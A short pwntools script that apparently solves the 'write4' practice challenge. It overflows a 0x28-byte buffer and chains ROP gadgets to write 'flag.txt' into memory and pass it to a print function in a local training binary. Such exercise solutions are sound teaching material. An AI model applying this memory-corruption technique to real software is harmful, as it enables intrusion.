from pwn import *

target = process("./write4")

storage = 0x601060
flagtxt = 0x7478742E67616C66

mov =0x0000000000400628 #: mov qword ptr [r14], r15 ; ret
poop =  0x0000000000400690 #: pop r14 ; pop r15 ; ret
poprdi = 0x0000000000400693
payload = "a" * 0x28 + p64(poop) + p64(storage) + p64(flagtxt) + p64(mov) + p64(poprdi) + p64(storage) + p64(0x400510)


target.sendline(payload)
target.interactive()
